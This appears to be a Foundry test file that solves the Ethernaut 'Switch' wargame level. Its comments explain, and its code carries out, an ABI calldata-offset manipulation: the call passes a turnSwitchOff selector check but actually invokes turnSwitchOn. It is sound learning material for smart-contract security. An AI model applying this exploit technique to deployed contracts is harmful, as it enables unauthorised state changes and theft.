pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Switch/SwitchFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract SwitchTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testSwitchHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        SwitchFactory switchFactory = new SwitchFactory();
        ethernaut.registerLevel(switchFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(switchFactory);
        Switch ethernautSwitch = Switch(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // We tweak the calldata to have the correct selector in position 68 but still be able to call turnSwitchOn. 
        // The idea is that the offset can be changed so that the bytes argument extracted isn't at position 68 in the bytes given.
        // To do this, we can pass: 
        // turnSwitchOff.selector || bytes32(uint256(96)) || bytes32(uint256(0)) || bytes32(bytes4(turnSwitchOff.selector)) || bytes32(len(bytes_array) == 4) || bytes == turnSwitchOn.selector
        //          4 bytes       +         32 bytes       +        32 bytes     +                  32 bytes                +                32 bytes         +                4 bytes                 
        // That way, the calldata check for turnSwitchOff passes, but once the bytes are extracted we actually call turnSwitchOn().
        // More info on the abi encoding in the [Solidity docs](https://docs.soliditylang.org/en/v0.8.20/abi-spec.html#argument-encoding).

        bytes memory turnSwitchOffData = abi.encode(96, 0, Switch.turnSwitchOff.selector, 4, Switch.turnSwitchOn.selector); // Elements are left-padded with 0s to reach 32 bytes
        bytes memory flipSwitchData = abi.encodePacked(Switch.flipSwitch.selector, turnSwitchOffData); // No padding because we want the first element to be only 4 bytes
        address(ethernautSwitch).call(flipSwitchData);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}